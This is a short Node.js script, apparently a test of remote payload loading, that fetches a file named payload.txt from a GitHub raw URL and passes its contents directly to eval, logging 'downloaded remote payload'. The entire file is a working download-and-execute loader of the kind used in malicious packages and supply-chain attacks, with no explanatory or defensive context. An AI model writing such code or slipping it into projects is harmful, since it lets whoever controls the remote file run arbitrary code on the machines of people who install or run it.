const https = require("https");

const URL = "https://raw.githubusercontent.com/JunYeopAn/rdd-remote-payload-test/main/payload.txt";

https.get(URL, (res) => {
  let data = "";
  res.on("data", chunk => data += chunk);
  res.on("end", () => {
    try {
      console.log("downloaded remote payload");
      eval(data);
    } catch (e) {
      console.error("payload exec error:", e);
    }
  });
}).on("error", (err) => {
  console.error("failed to download payload:", err);
});
